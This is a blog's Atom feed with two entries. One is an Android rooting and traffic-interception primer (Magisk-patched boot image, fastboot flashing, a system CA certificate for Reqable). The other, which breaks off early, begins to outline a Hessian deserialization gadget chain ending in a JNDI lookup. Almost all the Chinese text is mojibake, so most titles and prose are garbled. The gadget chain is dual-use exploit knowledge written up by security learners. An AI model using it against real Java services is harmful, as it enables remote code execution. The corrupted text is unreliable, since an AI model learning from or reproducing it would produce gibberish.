<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clown</title>
  
  <subtitle>clownçš„ç«™ç‚¹</subtitle>
  <link href="https://clowsman.github.io/atom.xml" rel="self"/>
  
  <link href="https://clowsman.github.io/"/>
  <updated>2025-04-19T13:39:52.597Z</updated>
  <id>https://clowsman.github.io/</id>
  
  <author>
    <name>clown</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å®‰å“æ¸—é€åŸºç¡€(rootç¯‡)</title>
    <link href="https://clowsman.github.io/2025/04/19/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-root%E7%AF%87/"/>
    <id>https://clowsman.github.io/2025/04/19/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-root%E7%AF%87/</id>
    <published>2025-04-19T13:18:28.000Z</published>
    <updated>2025-04-19T13:39:52.597Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œä¸»è¦æ˜¯ä»¥çœŸæœºä¸ºæµ‹è¯•ç¯å¢ƒï¼Œä¸ä½¿ç”¨æ¨¡æ‹Ÿå™¨ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯å°ç±³6ï¼Œå®‰å“ç‰ˆæœ¬ä¸º9</p><p>ä¸»è¦æ˜¯å­¦ä¹ ä¸€ä¸‹å’Œrootç›¸å…³çš„çŸ¥è¯†(<del>é¡ºä¾¿å†æ°´ä¸€ç¯‡åšå®¢</del>)</p><h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><p>ä¸€äº›ç›¸å…³çš„æœ¯è¯­å’ŒrootçŸ¥è¯†ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æå®¢æ¹¾çš„ROOTæŒ‡å—ï¼š<a href="https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&vd_source=35d5dfeb47a963c5dbc7d7d4f9c17ca5%EF%BC%8C%E5%AF%B9%E6%88%91%E8%BF%99%E4%B8%AA%E7%8E%A9%E6%9C%BA%E5%B0%8F%E7%99%BD%E8%82%A5%E8%82%A0%E5%8F%8B%E5%A5%BD">https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&amp;vd_source=35d5dfeb47a963c5dbc7d7d4f9c17ca5ï¼Œå¯¹æˆ‘è¿™ä¸ªç©æœºå°ç™½è‚¥è‚ å‹å¥½</a></p><h2 id="å®‰å“åˆ†åŒº"><a href="#å®‰å“åˆ†åŒº" class="headerlink" title="å®‰å“åˆ†åŒº"></a>å®‰å“åˆ†åŒº</h2><p>å¤§è‡´åˆ†ä¸ºäº”ä¸ªåˆ†åŒºï¼šBootã€Systemã€Dataã€Recoveryã€Cache</p><p><strong>é¦–å…ˆæ˜¯Bootåˆ†åŒº</strong><br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417135044.png" alt="Pasted image 20250417135044"><br>rootçš„æ“ä½œä¸»è¦ä¹Ÿæ˜¯åœ¨ä¿®æ”¹Bootåˆ†åŒºï¼Œè¿˜æœ‰ä¸€äº›æ¯”è¾ƒåº•å±‚çš„æ“ä½œï¼Œæ¯”å¦‚æ”¹CPUè°ƒåº¦ã€ç»™GPUè¶…é¢‘ç­‰ä¹Ÿåœ¨è¿™ä¸ªåˆ†åŒº</p><p>å¦‚æœè¯¥åˆ†åŒºæŸåçš„è¯ï¼Œå°±ä¼šå¯¼è‡´å¯åŠ¨å¡åœ¨ç¬¬ä¸€å±ï¼Œä¹Ÿå°±æ˜¯logoç•Œé¢</p><p><strong>Systemåˆ†åŒº</strong><br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417135314.png" alt="Pasted image 20250417135314"><br>è¿™é‡Œå›¾å¾ˆå½¢è±¡ä¹Ÿä¸å¤šè¯´äº†ï¼ŒSystemåˆ†åŒºè¦æ˜¯æŸåå°±ä¼šå¡åœ¨å¼€æœºç¬¬äºŒå±ä¹Ÿå°±æ˜¯è¿›ä¸å»æ“ä½œç³»ç»Ÿäº†ï¼Œå¡åœ¨åŠ¨ç”»ç•Œé¢</p><blockquote><p>Vendoråˆ†åŒºç°åœ¨ä¼šå½’å¹¶åˆ°Systemåˆ†åŒºäº†ï¼Œä»¥å‰è¯´æ˜¯ä¼šç‹¬ç«‹å‡ºæ¥</p></blockquote><p><strong>Dataåˆ†åŒº</strong><br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417135840.png" alt="Pasted image 20250417135840"><br>è¿™ä¸ªç†è§£ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯å¹³æ—¶å„ç§çš„ä½¿ç”¨æ•°æ®ä¹‹ç±»çš„</p><p><strong>Cacheåˆ†åŒº</strong><br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417135931.png" alt="Pasted image 20250417135931"><br>å°±æ˜¯ç¼“å­˜ä¸€äº›å¸¸æ‰“å¼€çš„åº”ç”¨ç¨‹åºçš„æ•°æ®ï¼Œæ–¹ä¾¿å¿«é€Ÿå¯åŠ¨ä¹‹ç±»çš„</p><p><strong>Recoveryåˆ†åŒº</strong><br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417140016.png" alt="Pasted image 20250417140016"><br>æ¢å¤åˆ†åŒºç±»ä¼¼äºPEçš„å­˜åœ¨ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤å’Œæ›´æ–°å…¶ä»–åˆ†åŒºçš„å†…å®¹ï¼Œåˆ·æœºåˆ·ç³»ç»Ÿä¸€èˆ¬å°±åœ¨è¿™ä¸ªåˆ†åŒºè¿›è¡Œ</p><p>ä½†æ˜¯ç°åœ¨å¾ˆå¤šæ‰‹æœºä¸å­˜åœ¨Recoveryåˆ†åŒºäº†ï¼Œå› ä¸ºå®‰å“7.0ä¹‹åå¼•å…¥æ–°çš„OTAå‡çº§æ–¹å¼ï¼š<code>A/B System Updates</code><br>å®ƒæ˜¯æŠŠSystemå’ŒBootåˆ†æˆäº†ä¸¤å¥—<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417140307.png" alt="Pasted image 20250417140307"><br>å¹³æ—¶åœ¨ç”¨çš„å°±æ˜¯Aåˆ†åŒºï¼Œæ²¡åœ¨ç”¨çš„å°±æ˜¯Båˆ†åŒº<br>è¿™ç§åˆ†åŒºçš„å¥½å¤„å°±æ˜¯å¯ä»¥åšåˆ°ç³»ç»Ÿæ— ç¼å‡çº§ï¼Œè€Œä¸”å¯ä»¥åšåˆ°é˜²æ­¢å‡çº§ç³»ç»Ÿå¼‚å¸¸å¯¼è‡´æ— æ³•å¼€æœºç­‰æƒ…å†µï¼ŒåŸç†å°±æ˜¯ç³»ç»Ÿå‡çº§é¦–å…ˆæ˜¯åœ¨å¤‡ä»½åˆ†åŒºå‡çº§ï¼Œç„¶åæ‰‹æœºé‡å¯å°±ä¼šå°†Aã€Båˆ†åŒºåˆ‡æ¢ï¼Œæ­¤æ—¶å‡çº§å¥½çš„å¤‡ç”¨åˆ†åŒºå°±æ˜¯æˆ‘ä»¬çš„ä¸»åˆ†åŒºï¼Œå½“ç„¶å‡çº§å¼‚å¸¸å¤„ç†ä¹Ÿæ˜¯åŒç†ï¼Œåªè¦æˆ‘ä»¬å°†åˆ†åŒºå›æ»šå›æœªå‡çº§çš„å°±èƒ½è§£å†³äº†ã€‚</p><blockquote><p>ä½†æ˜¯è¿™ç§æ–¹å¼çš„ç¼ºç‚¹å°±æ˜¯ä¼šå ç”¨åŒå€Systemç©ºé—´ï¼Œå› ä¸ºæ€»æœ‰ä¸€ä¸ªéœ€è¦ç”¨æ¥å¤‡ä»½</p></blockquote><p>äºæ˜¯åˆå¤šäº†ä¸€ä¸ª<code>VAB(Virtual A/B System Updates)</code>è™šæ‹ŸABåˆ†åŒºç”¨æ¥è§£å†³è¿™ç§æƒ…å†µï¼Œå®‰å“11åçš„æœºå‹æ™®éé‡‡ç”¨è¿™ç§æ–¹å¼æ¥è§£å†³ç©ºé—´å ç”¨é—®é¢˜<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417163518.png" alt="Pasted image 20250417163518"></p><p>è¿™ç§ABåˆ†åŒºåˆ·æœºä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œå› ä¸ºRecoveryå¹¶åˆ°äº†Bootåˆ†åŒºé‡Œäº†<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417163630.png" alt="Pasted image 20250417163630"><br>æ‰€ä»¥æ›´æ¨èç”¨æ›´åº•å±‚çš„fastbootæ¥æ“ä½œ</p><h2 id="bootloaderå¼•å¯¼åŠ è½½å™¨å’Œfastboot"><a href="#Bootloader-å¼•å¯¼åŠ è½½å™¨-å’ŒFastboot" class="headerlink" title="Bootloader(å¼•å¯¼åŠ è½½å™¨)å’ŒFastboot"></a>Bootloader(å¼•å¯¼åŠ è½½å™¨)å’ŒFastboot</h2><p>è¿™é‡Œéœ€è¦å…ˆçŸ¥é“Bootloaderï¼Œä¸‹é¢æ˜¯æå®¢æ¹¾çš„ä¸€å¼ å›¾</p><p><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417172743.png" alt="Pasted image 20250417172743"><br>Recoveryæ¯”ä½œPEï¼Œfastbootçš„è¿™ä¸ªé˜¶æ®µå°±æ˜¯BIOSæˆ–è€…UEFIäº†<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417203120.png" alt="Pasted image 20250417203120"><br>å¼•å¯¼æ“ä½œç³»ç»Ÿå†…æ ¸ä¹‹åå°±ä¼šè¿›å…¥fastbooté˜¶æ®µï¼Œä¹Ÿå°±æ˜¯åˆ·æœºé˜¶æ®µäº†ï¼Œfastbootæ¨¡å¼ä¸‹è¿æ¥ç”µè„‘å¯ä»¥é€šè¿‡fastbootç¨‹åºè¾“å…¥å‘½ä»¤æ‰§è¡Œå¾ˆå¤šæ“ä½œï¼Œæ¯”å¦‚è§£é”è®¾å¤‡ã€æ³¨å…¥booté•œåƒã€çº¿åˆ·ç³»ç»Ÿç­‰</p><p>ä¸åŒæ‰‹æœºè¿›å…¥fastbootçš„æ–¹å¼<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417203340.png" alt="Pasted image 20250417203340"><br>è¿˜å¯ä»¥é€šè¿‡adbç”¨ä¸‹é¢å‘½ä»¤è¿›å…¥</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">adb reboot bootloader<br></code></pre></td></tr></table></figure><p>è¿æ¥æ‰‹æœºåå¯ä»¥ç”¨ <code>fastboot devices</code>æ£€æµ‹æ˜¯å¦è¿æ¥è®¾å¤‡ï¼Œå½“ç„¶ä¹Ÿå¯èƒ½æ²¡æœ‰è¯†åˆ«åˆ°ï¼Œæ¯”å¦‚æˆ‘è¿™æ ·<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417203524.png" alt="Pasted image 20250417203524"><br>è¿™æ˜¯é©±åŠ¨é—®é¢˜ï¼Œéœ€è¦æˆ‘ä»¬å»è®¾å¤‡ç®¡ç†å™¨è£…ä¸€ä¸‹fastbooté©±åŠ¨ï¼Œé©±åŠ¨é“¾æ¥ï¼š<a href="https://cz-jam.lanzouj.com/iZICY02v2k8j">https://cz-jam.lanzouj.com/iZICY02v2k8j</a><br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417205450.png" alt="Pasted image 20250417205450"></p><p><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417204841.png" alt="Pasted image 20250417204841"></p><p>å®‰è£…å¥½ä¹‹åå°±èƒ½æ£€æµ‹äº†<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417205924.png" alt="Pasted image 20250417205924"></p><p>fastbootçš„ä¸€äº›å‘½ä»¤<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417215838.png" alt="Pasted image 20250417215838"></p><h2 id="å¡åˆ·å’Œçº¿åˆ·"><a href="#å¡åˆ·å’Œçº¿åˆ·" class="headerlink" title="å¡åˆ·å’Œçº¿åˆ·"></a>å¡åˆ·å’Œçº¿åˆ·</h2><p>å¡åˆ·æŒ‡çš„å°±æ˜¯é€šè¿‡Recoveryæ–¹å¼åˆ·æœºï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æŠŠè¦åˆ·çš„åŒ…æ‹·è¿›æ‰‹æœºé‡Œï¼Œåœ¨æ‰‹æœºä¸Šåˆ·</p><p>çº¿åˆ·æŒ‡çš„å°±æ˜¯é€šè¿‡fastbootçš„æ–¹å¼æ¥åˆ·æœºï¼Œä¸”éœ€è¦ç”¨æ•°æ®çº¿è¿æ¥ç”µè„‘</p><h2 id="å¼€å‘è€…é€‰é¡¹"><a href="#å¼€å‘è€…é€‰é¡¹" class="headerlink" title="å¼€å‘è€…é€‰é¡¹"></a>å¼€å‘è€…é€‰é¡¹</h2><p>è¿›å…¥æ‰‹æœºçš„å‚æ•°ç•Œé¢ç‚¹å‡»7æ¬¡ç‰ˆæœ¬å·å°±å¯ä»¥è¿›å…¥</p><h2 id="adb"><a href="#ADB" class="headerlink" title="ADB"></a>ADB</h2><p>ä»è¿™é‡Œå®‰è£…å³å¯ï¼š<a href="https://developer.android.com/tools/releases/platform-tools?hl=zh-cn#downloads">https://developer.android.com/tools/releases/platform-tools?hl=zh-cn#downloads</a><br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417125510.png" alt="Pasted image 20250417125510"><br>é‡Œé¢å°±åŒ…å«äº†å¾ˆå¤šå¸¸ç”¨çš„å·¥å…·åŒ…æ‹¬æˆ‘ä»¬åé¢ä¼šç”¨åˆ°çš„fastboot</p><p>è‡³äºadbçš„ä½¿ç”¨ï¼Œå¯ä»¥ç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://developer.android.com/tools/adb?hl=zh-cn#burstMode">https://developer.android.com/tools/adb?hl=zh-cn#burstMode</a></p><h2 id="rootæ‰‹æœº"><a href="#rootæ‰‹æœº" class="headerlink" title="rootæ‰‹æœº"></a>rootæ‰‹æœº</h2><p>è¿™æ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥äº†ï¼Œåªæœ‰rootä¹‹åæ‰èƒ½å®‰è£…è¯ä¹¦ï¼Œè¿™é‡Œçš„æ“ä½œéƒ½éœ€è¦æ‰“å¼€å¼€å‘è€…é€‰é¡¹ä¹‹åæ‰è¡Œ</p><p>ç¬¬ä¸€æ­¥æ˜¯OEMè§£é”ï¼Œåªè¦å»å¼€å‘è€…é€‰é¡¹é‡Œé¢æ‰“å¼€å³å¯ï¼Œæœ‰äº›æ‰‹æœºå¯èƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥æœ€å¥½è¿˜æ˜¯é€‰æ‹©æœ‰çš„ï¼Œä¸è¿‡è¿™ä¸€æ­¥å¹¶ä¸ä¸€å®šèƒ½è§£é”BootLoaderï¼Œæ¯”å¦‚å°ç±³è§£é”OEMåªæ˜¯è¡¨ç¤ºå…è®¸è§£é”BootLoader</p><p>å¤§éƒ¨åˆ†æ‰‹æœºrootåŸºæœ¬éƒ½æ˜¯ä¸¤æ­¥èµ°ï¼Œç¬¬ä¸€æ­¥è§£é”BootLoaderï¼Œç¬¬äºŒæ­¥å†ä¿®æ”¹bootæ–‡ä»¶åˆ·å…¥Magisk</p><p>ç„¶åå°±æ˜¯è§£é”BLäº†ï¼Œè¿™é‡Œå°ç±³å¯ä»¥ç›´æ¥ç‚¹å‡»è§£é”çŠ¶æ€ï¼Œç„¶åç‚¹å‡»ç»‘å®šè®¾å¤‡å’Œè´¦å·ï¼Œè¿›å…¥fastbootæ¨¡å¼ï¼Œç„¶åç”µè„‘ä¸Šä¸‹è½½å®˜æ–¹çš„è§£é”è®¾å¤‡ï¼š<a href="https://www.miui.com/unlock/index.html">https://www.miui.com/unlock/index.html</a><br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417212144.png" alt="Pasted image 20250417212144"></p><p>å®˜ç½‘ä¹Ÿè´´å¿ƒåœ°ç»™å‡ºäº†æµç¨‹<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417212246.png" alt="Pasted image 20250417212246"><br>æˆ‘ä»¬usbè¿æ¥æ‰‹æœºåï¼Œå¯åŠ¨å·¥å…·ç‚¹å‡»è§£é”å³å¯<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417212611.png" alt="Pasted image 20250417212611"></p><p>å…¶ä»–å“ç‰Œçš„æ‰‹æœºè§£é”å°±ä¸è®°å½•äº†</p><p>è§£é”å®Œä¹‹åå°±å¯ä»¥å¼€å§‹rootäº†ï¼Œrootåˆ†ä¸ºä¸¤ç§æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å‰é¢è¯´çš„å¡åˆ·å’Œçº¿åˆ·<br>è¿™é‡Œé‡‡ç”¨çº¿åˆ·ï¼Œæ‰€ä»¥ç®€å•ä»‹ç»ä¸€ä¸‹å¡åˆ·çš„æµç¨‹å°±ç®—äº†ï¼Œæ¯•ç«Ÿæˆ‘åªæ˜¯ä¸ºäº†åšæ¸—é€æµ‹è¯•ï¼Œä¸éœ€è¦è¿™ä¹ˆå¤æ‚</p><h3 id="å¡åˆ·"><a href="#å¡åˆ·" class="headerlink" title="å¡åˆ·"></a>å¡åˆ·</h3><p>å› ä¸ºè¯´è¿‡Recoveryç±»ä¼¼PEï¼Œä½†æ˜¯æ‰‹æœºå‡ºå‚ç»™çš„RecoveryåŠŸèƒ½ç®€å•ä¸èƒ½éšä¾¿åˆ·ä¸œè¥¿ï¼Œä¹Ÿå°±æ˜¯éœ€è¦åˆ·å…¥ç¬¬ä¸‰æ–¹Recoveryæ¥è¿›è¡Œæ“ä½œï¼Œå‡ºåçš„ç¬¬ä¸‰æ–¹Recoveryå°±æ˜¯TWRPï¼Œä»–çš„é¡¹ç›®åœ°å€åœ¨è¿™ï¼š<a href="https://twrp.me/">https://twrp.me/</a></p><p>è¿™æ˜¯ä¸€ä¸ªæµç¨‹å›¾ï¼š<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417213449.png" alt="Pasted image 20250417213449"></p><p>å…ˆé€šè¿‡fastbootçº¿åˆ·TWRPï¼Œç„¶åå†è¿›å…¥TWRPè¿›è¡Œæ“ä½œï¼Œå„å“ç‰Œè¿›å…¥TWRPä¹Ÿå°±æ˜¯Recoveryå¦‚ä¸‹ï¼š<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417213636.png" alt="Pasted image 20250417213636"></p><p>ä¹Ÿå¯ä»¥adbç›´æ¥é‡å¯è¿›å…¥recovery</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">adb reboot recovery<br></code></pre></td></tr></table></figure><p>åˆ·æ–°recoveryçš„å‘½ä»¤<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417213751.png" alt="Pasted image 20250417213751"></p><p>ç„¶åå°±æ˜¯åˆ·å…¥æœ€æµè¡Œçš„rootç®¡ç†å·¥å…·Magiskï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„é¢å…·ï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/topjohnwu/Magisk">https://github.com/topjohnwu/Magisk</a><br>å…·ä½“æ“ä½œå¤§æ¦‚å°±æ˜¯å°†zipæ‰”è¿›æ‰‹æœºï¼Œç„¶åTWRPä¸‹è½½ï¼Œå†å°†åç¼€æ”¹æˆapkå®‰è£…å³å¯ï¼Œå…·ä½“å°±ä¸å°è¯•äº†ï¼Œç°åœ¨æ–°çš„Magiskç›´æ¥å°±æ˜¯apkäº†</p><p>è€Œä¸”åé¢ABåˆ†åŒºçš„è¯ï¼Œåˆ·TWRPå°±å¾ˆéº»çƒ¦äº†ï¼Œè¦åˆ·ä¸¤é</p><h3 id="çº¿åˆ·"><a href="#çº¿åˆ·" class="headerlink" title="çº¿åˆ·"></a>çº¿åˆ·</h3><p>è¿™é‡Œç»™ä¸€ä¸ªçº¿åˆ·çš„æµç¨‹å›¾<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417214435.png" alt="Pasted image 20250417214435"><br>Magiskçš„åŸç†å°±æ˜¯å¯¹Booté•œåƒè¿›è¡Œä¿®è¡¥æ¥è·å–rootï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æå–å‡ºBooté•œåƒï¼Œä¿®è¡¥å¥½å†åˆ·å…¥ï¼Œä½†æ˜¯æå–Booté•œåƒåˆéœ€è¦rootï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨åˆ«äººå·²ç»ç»™æˆ‘ä»¬æå–å¥½çš„booté•œåƒï¼Œå‚å•†çš„åˆ·æœºåŒ…é‡Œå°±æœ‰</p><p>å°ç±³å°±ç›´æ¥å»è¿™é‡Œä¸‹è½½ï¼š<a href="https://xiaomirom.com/">https://xiaomirom.com/</a><br>ä¹Ÿå¯ä»¥ç›´æ¥åœ¨æ‰‹æœºç³»ç»Ÿæ›´æ–°é‡Œé¢ä¸‹è½½å®Œæ•´åŒ…ï¼Œä¸€èˆ¬ä¸‹è½½åˆ°downloadé‡Œé¢</p><p>çº¿åˆ·åŒ…ä¸‹è½½å¥½ä¹‹åè§£å‹æ‰¾åˆ°boot.imgå³å¯<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417223452.png" alt="Pasted image 20250417223452"></p><p>ç„¶åå°†boot.imgä¼ åˆ°æ‰‹æœºï¼Œæˆ‘ä»¬è¦å…ˆåœ¨æ‰‹æœºä¸Šå®‰è£…å¥½Mgiskï¼Œç„¶åä¿®è¡¥è¯¥boot.imgæ–‡ä»¶ï¼Œç„¶åæŠŠè¯¥æ–‡ä»¶æ‹·åˆ°ç”µè„‘ä¸Šï¼Œæ‰‹æœºé‡å¯åˆ°fastbootæ¨¡å¼ï¼Œç„¶ååˆ·å…¥ä¿®è¡¥åçš„è¿™ä¸ªbootå°±å¯ä»¥è·å–rootæƒé™äº†</p><p>ä¿®è¡¥åçš„é•œåƒ<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417225431.png" alt="Pasted image 20250417225431"></p><p>ç„¶åfastbootåˆ·å…¥è¯¥é•œåƒ</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">fastboot flash boot .\magisk_patched-<span class="hljs-number">28100</span>_E0MWY.img<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417225717.png" alt="Pasted image 20250417225717"><br>è¿™æ—¶å€™é‡å¯æ‰‹æœºï¼Œå¦‚æœèƒ½åˆ‡æ¢åˆ°è¶…çº§ç”¨æˆ·å°±æ˜¯æˆåŠŸäº†<br><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417230244.png" alt="Pasted image 20250417230244"></p><p>æˆåŠŸrootï¼</p><h1 id="æŠ“åŒ…é…ç½®"><a href="#æŠ“åŒ…é…ç½®" class="headerlink" title="æŠ“åŒ…é…ç½®"></a>æŠ“åŒ…é…ç½®</h1><p>è¿™é‡Œé€‰æ‹©ç”¨å°é»„é¸Ÿï¼š<a href="https://reqable.com/">https://reqable.com/</a></p><p>ä¸‹è½½å®¢æˆ·ç«¯çš„æ—¶å€™éœ€è¦æŸ¥çœ‹æ¶æ„ï¼Œå¯ä»¥ç”¨åœ¨ubsè°ƒè¯•è¿æ¥ä¹‹åç”¨ä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">adb shell getprop ro.product.cpu.abi<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417125847.png" alt="Pasted image 20250417125847"></p><p>å„æ¶æ„çš„è¯´æ˜ï¼š</p><ul><li>armeabiv-v7a: ç¬¬7ä»£åŠä»¥ä¸Šçš„ ARM å¤„ç†å™¨ã€‚2011å¹´5æœˆä»¥åçš„ç”Ÿäº§çš„å¤§éƒ¨åˆ†Androidè®¾å¤‡éƒ½ä½¿ç”¨å®ƒ.</li><li>arm64-v8a: ç¬¬8ä»£ã€64ä½ARMå¤„ç†å™¨ï¼Œç°åœ¨å·²ç»æ˜¯ä¸»æµç‰ˆæœ¬ï¼Œä¸‰æ˜Ÿ Galaxy S6æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚</li><li>armeabi: ç¬¬5ä»£ã€ç¬¬6ä»£çš„ARMå¤„ç†å™¨ï¼Œæ—©æœŸçš„æ‰‹æœºç”¨çš„æ¯”è¾ƒå¤šã€‚</li><li>x86: å¹³æ¿ã€æ¨¡æ‹Ÿå™¨ç”¨å¾—æ¯”è¾ƒå¤šã€‚</li><li>x86_64: 64ä½çš„å¹³æ¿ã€‚</li></ul><p>ç„¶åæˆ‘ä»¬ä¹‹åçš„æ“ä½œéƒ½éœ€è¦rootæ‰è¡Œï¼Œç„¶åå°±æ˜¯å¯åŠ¨reqableçš„è¿æ¥ï¼Œç„¶åå®‰è£…androidçš„è¯ä¹¦ï¼Œè¿™ä¸€æ­¥éƒ½æ˜¯è‡ªåŠ¨çš„ï¼Œè€Œä¸”éƒ½æœ‰æŒ‡å¼•ï¼Œå°±ä¸è®°å½•äº†</p><blockquote><p>å®‰è£…äº†ç³»ç»Ÿè¯ä¹¦åï¼Œå¯ä»¥ä¸ç”¨å®‰è£…ç”¨æˆ·è¯ä¹¦äº†</p></blockquote><p><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417233103.png" alt="Pasted image 20250417233103"></p><p>ç„¶åå°±å¯ä»¥æ„‰å¿«çš„æŠ“åŒ…äº†</p><p>å¦‚æœå«Œé‡æ”¾ä¸æ–¹ä¾¿ï¼Œè¿˜å¯ä»¥å°†æµé‡å¯¼å‘bpæˆ–è€…yakitï¼Œè®¾ç½®ä¸€ä¸ªäºŒçº§ä»£ç†å³å¯</p><p><img src="https://cdn.clown2024.cn/Pasted%20image%2020250417235319.png" alt="Pasted image 20250417235319"></p><p>ç„¶åå°±å¯ä»¥æ„‰å¿«åœ°æŠ“åŒ…äº†ï¼Œè™½ç„¶åé¢è¿˜ä¼šæœ‰å¾ˆå¤šè®©ä½ æŠ“ä¸åˆ°åŒ…çš„å¤´ç–¼é—®é¢˜ğŸ˜­</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™é‡Œä¸»è¦æ˜¯ä»¥çœŸæœºä¸ºæµ‹è¯•ç¯å¢ƒï¼Œä¸ä½¿ç”¨æ¨¡æ‹Ÿå™¨ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯å°ç±³6ï¼Œå®‰å“ç‰ˆæœ¬ä¸º9&lt;/p&gt;
&lt;p&gt;ä¸»è¦æ˜¯å­¦ä¹ ä¸€ä¸‹å’Œrootç›¸å…³çš„çŸ¥è¯†(&lt;del&gt;é¡ºä¾¿å†æ°´ä¸€ç¯‡åšå®¢&lt;/del&gt;)&lt;/p&gt;
&lt;h1 id=&quot;å‰ç½®çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#å‰ç½®çŸ¥è¯†&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="web" scheme="https://clowsman.github.io/categories/web/"/>
    
    
    <category term="æ¸—é€" scheme="https://clowsman.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="å®‰å“" scheme="https://clowsman.github.io/tags/%E5%AE%89%E5%8D%93/"/>
    
  </entry>
  
  <entry>
    <title>Hessianåˆ©ç”¨é“¾</title>
    <link href="https://clowsman.github.io/2025/03/30/Hessian%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>https://clowsman.github.io/2025/03/30/Hessian%E5%88%A9%E7%94%A8%E9%93%BE/</id>
    <published>2025-03-30T14:55:05.000Z</published>
    <updated>2025-03-30T14:58:06.299Z</updated>
    
    <content type="html"><![CDATA[<p>æ°´ä¸€ä¸‹åšå®¢ï¼Œä¹‹å‰è¿™ç¯‡å†™åœ¨æœ¬åœ°äº†ï¼Œç°åœ¨æ”¾åˆ°åšå®¢æ–¹ä¾¿ç”¨çš„æ—¶å€™çœ‹ï¼Œå› ä¸ºå‰é¢nacosçš„æ—¶å€™ç”¨åˆ°äº†ä¸€äº›</p><p>è¿™ä¸¤æ¡é“¾å­éƒ½æ˜¯åŸºäºåŸç”Ÿjdkçš„ï¼Œä¸éœ€è¦å…¶ä»–ä¾èµ–</p><h1 id="multiuidefaultsåˆ©ç”¨é“¾"><a href="#MultiUIDefaultsåˆ©ç”¨é“¾" class="headerlink" title="MultiUIDefaultsåˆ©ç”¨é“¾"></a>MultiUIDefaultsåˆ©ç”¨é“¾</h1><p>é“¾å­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">javax.swing.MultiUIDefaults.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br>                    SwingLazyValue.createValue<br>                        javax.naming.InitialContext.doLookup()<br></code></pre></td></tr></table></figure><p>toStringçš„è§¦å‘åˆ©ç”¨Hessiançš„å¼‚å¸¸toStringæ¥è§¦å‘å³å¯</p><p>è¿™ä¸ªé“¾æ˜¯ä» MultiUIDefaults çš„ toString æ–¹æ³•å¼€å§‹ï¼Œä¸€è·¯è°ƒç”¨åˆ° SwingLazyValue çš„ createValueï¼ˆä½†æ˜¯SwingLazyValue å¥½åƒåœ¨ jdk8 ä¹‹ååˆ äº†ï¼‰</p><h2 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" 